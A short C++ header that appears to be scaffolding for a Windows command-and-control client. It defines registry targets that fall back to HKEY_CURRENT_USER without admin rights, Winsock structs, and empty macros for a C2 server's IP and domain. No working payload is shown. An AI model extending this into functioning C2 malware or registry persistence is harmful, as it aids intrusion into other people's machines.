#include <iostream>

/**
 * Is the program in development mode
*/
#define REPORTER_DEBUG

/**
 * Behaves count
*/
#define BEHAVES_COUNT 2

/**
 * Registry definitions
*/
#define KEY_TARGET HKEY_LOCAL_MACHINE
#define KEY_NOT_ADMIN_TARGET HKEY_CURRENT_USER

/**
 * Winsock structs
*/
typedef struct WINCLIENTINFO
{
    std::string ipAddr;
    int Port;
} ClietInfo;

typedef struct WINSERVERINFO
{
    std::string ServerDomainName;
    std::string ServerIp;
    int Port;
} ServerInfo;

/**
 * C2 SERVER's ip and domain name
*/
#define C2IP
#define C2DM